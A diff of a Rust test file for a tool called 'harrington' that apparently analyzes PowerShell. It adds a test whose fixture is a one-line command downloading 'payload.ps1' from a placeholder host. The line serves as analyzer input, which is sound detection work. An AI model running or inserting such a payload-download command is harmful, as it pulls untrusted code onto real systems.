@@ -534,6 +534,35 @@ fn analyze_emits_json_to_stdout() {
 }
 
 #[test]
+fn bare_file_argument_defaults_to_analyze_json() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.ps1");
+    fs::write(
+        &input,
+        "Invoke-WebRequest -Uri https://bare-file.example/payload.ps1",
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .arg(input.to_str().expect("path"))
+        .output()
+        .expect("run");
+
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(
+        v["extracted"]["powershell"].as_u64().unwrap_or_default(),
+        1,
+        "bare path should be analyzed as standalone PowerShell: {v}"
+    );
+}
+
+#[test]
 fn analyze_json_includes_extracted_counts() {
     use base64::Engine;
 
